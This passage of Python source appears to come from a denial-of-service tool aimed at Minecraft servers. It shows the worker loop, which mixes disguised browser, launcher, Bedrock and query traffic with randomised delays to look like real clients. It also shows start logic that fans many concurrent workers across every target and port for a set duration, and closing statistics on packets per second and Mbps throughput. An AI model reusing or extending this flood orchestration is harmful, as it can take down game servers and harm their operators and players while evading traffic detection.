                self.update_stats("failures", 1)
                return False
    
    async def client_worker(self, target: str, port: int):
        """Worker that simulates different client behaviors"""
        while self.running:
            try:
                # Choose client type
                client_type = self.choose_client_type()
                
                # Simulate the chosen client type
                if client_type == "browser":
                    await self.simulate_browser_query(target, port)
                elif client_type == "launcher":
                    await self.simulate_launcher_query(target, port)
                elif client_type == "bedrock":
                    await self.simulate_bedrock_query(target, port)
                elif client_type == "query":
                    await self.simulate_server_query(target, port)
                
                # Random delay between queries to simulate realistic behavior
                delay = random.uniform(0.1, self.query_interval * 2)
                await asyncio.sleep(delay)
                
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Client worker error: {str(e)}")
                await asyncio.sleep(1)  # Backoff on error
    
    def start(self):
        """Start the legitimate client simulation"""
        self.running = True  # Ensure running is set
        self.start_time = time.time()  # Track start time
        super().start()
        
        # Start stats display thread
        self._stats_thread = threading.Thread(target=self._show_stats_loop)
        self._stats_thread.daemon = True
        self._stats_thread.start()
        
        UI.print_info(f"Starting Minecraft legitimate client simulation with {self.threads} threads")
        UI.print_info(f"Targeting {len(self.targets)} servers on {len(self.ports)} ports")
        
        # Create and run the event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            tasks = []
            for target in self.targets:
                for port in self.ports:
                    for _ in range(self.threads):
                        tasks.append(self.client_worker(target, port))
            
            # Run for specified duration
            loop.run_until_complete(asyncio.gather(
                asyncio.sleep(self.duration),
                *tasks,
                return_exceptions=True
            ))
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()
            loop.close()
    
    def stop(self):
        """Stop the operation gracefully"""
        if not self.running:
            return
        self.running = False
        UI.print_info("Stopping Minecraft legitimate client simulation...")
        
        # Wait for stats thread to finish
        if self._stats_thread and self._stats_thread.is_alive():
            self._stats_thread.join(timeout=1.0)
        
        # Display final stats
        with self._stats_lock:
            total_time = time.time() - self.start_time
            avg_pps = self.stats["packets_sent"] / max(1, total_time)
            avg_mbps = (self.stats["bytes_sent"] * 8 / 1_000_000) / max(1, total_time)
            success_rate = (self.stats["successful"] / max(1, self.stats["packets_sent"])) * 100
            
            UI.print_header("Final Statistics")
            print(f"Duration: {total_time:.2f} seconds")
            print(f"Total packets: {self.stats['packets_sent']:,}")
            print(f"Average PPS: {avg_pps:.2f}")
            print(f"Average throughput: {avg_mbps:.2f} Mbps")
            print(f"Success rate: {success_rate:.2f}%")
            print(f"Client distribution:")
            print(f"  - Browser queries: {self.stats['browser_queries']:,}")
            print(f"  - Launcher queries: {self.stats['launcher_queries']:,}")
            print(f"  - Bedrock queries: {self.stats['bedrock_queries']:,}")
            print(f"  - Server queries: {self.stats['server_queries']:,}")
        
        super().stop()
